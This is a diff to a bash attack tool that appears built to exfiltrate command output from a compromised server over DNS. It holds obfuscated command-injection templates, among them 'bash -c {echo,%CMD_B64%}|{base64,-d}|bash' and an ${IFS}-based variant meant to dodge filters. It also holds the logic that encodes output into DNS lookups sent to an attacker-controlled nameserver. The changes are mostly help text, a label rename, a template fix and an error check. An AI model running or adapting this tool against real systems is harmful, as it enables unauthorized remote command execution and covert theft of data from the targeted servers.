@@ -16,7 +16,7 @@ function usage {
 Usage:
     $0 [OPTION]... -- command that captures the incoming dns traffic
     
-    -h HOST             The host with a wildcard DNS record pointing to our nameserver. This can be a random name in case we control the name server through the DNS_TRIGGER (e.g. Resolve-DnsName -Server OUR_SERVER -Name)
+    -h HOST             The host with a wildcard DNS record pointing to our nameserver. This can be a random name in case we control the name server through the DNS_TRIGGER and direct connections to that NS are allowed by the target server (unlikely)
     -d DNS_TRIGGER      The command that will trigger DNS requests on the external server
     -c CMD              The command the output of which we are exfiltrating
     -x DISPATCHER       Path to the script that will trigger the command execution on the server. 
@@ -188,7 +188,7 @@ NC='\033[0m'
 printf "Dispatcher: ${YELLOW}%s${NC}\n" "$dispatcher"
 [[ ! -f $dispatcher ]] && printf "${RED}Dispatcher file not found${NC}\n"
 printf "Base DNS Host: ${YELLOW}%s${NC}\n" "$dns_host"
-printf "DNS Program: ${YELLOW}%s${NC}\n" "$dns_trigger"
+printf "DNS Trigger Command: ${YELLOW}%s${NC}\n" "$dns_trigger"
 printf "Number of labels and label size: ${YELLOW}${nlabels}x${label_size}${NC}\n"
 printf "Listening to DNS traffic with: ${YELLOW}%s${NC}\n" "${get_dns_traffic_cmd[*]}"
 [[ $EUID -ne 0 ]] && printf "${RED}EUID!=0, might not have enough privs to listen to DNS traffic${NC}\n"
@@ -199,7 +199,7 @@ printf "Listening to DNS traffic with: ${YELLOW}%s${NC}\n" "${get_dns_traffic_cm
 ##########bash definitions#######
 assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
 [[ $oci -eq 1 ]] && {
-    assign outer_cmd_template 'bash -c $@|base64${IFS}-d|bash . echo %CMD_B64%'
+    assign bash outer_cmd_template 'bash -c $@|base64${IFS}-d|bash . echo %CMD_B64%'
 }
 
 assign bash innerdns_cmd_template ' %dns_trigger% %USER_CMD%.%STAGE_ID%.%UNIQUE_DNS_HOST%'
@@ -259,6 +259,12 @@ debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
 "$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
 #(sleep 2;"$dispatcher" "$outer_cmd" >/dev/null 2>&1)&
 cmd_out_len=$(listen_for ".len.${unique_dns_host}")
+
+[[ -z $cmd_out_len ]] && {
+    echo "Failed to get the output length, verify that we can listen to DNS traffic"
+    exit
+}
+
 echo "The command output length is: $cmd_out_len"
 
 
